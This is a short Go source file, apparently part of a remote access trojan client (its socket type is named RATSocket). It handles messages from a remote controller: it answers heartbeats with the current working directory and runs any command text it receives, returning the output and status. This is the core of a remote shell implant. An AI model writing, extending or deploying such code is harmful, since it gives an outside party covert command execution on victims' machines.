package handler

import (
	"os"
	"time"

	"client-go/executor"
	"client-go/protocol"
)

func Handle(sock *protocol.RATSocket, msg map[string]interface{}) {

	switch msg["type"] {

	case "heartbeat":
		sock.Send(map[string]interface{}{
			"type":      "heartbeat_ack",
			"id":        msg["id"],
			"client_ts": time.Now().Unix(),
			"cwd":       cwd(),
		})

	case "command":
		id := int(msg["id"].(float64))
		cmd := msg["text"].(string)

		status, result := executor.Execute(cmd)

		sock.Send(map[string]interface{}{
			"type":   "result",
			"id":     id,
			"status": status,
			"text":   result,
			"cwd":    cwd(),
			"eof":    1,
		})
	}
}

func cwd() string {
	d, _ := os.Getwd()
	return d
}
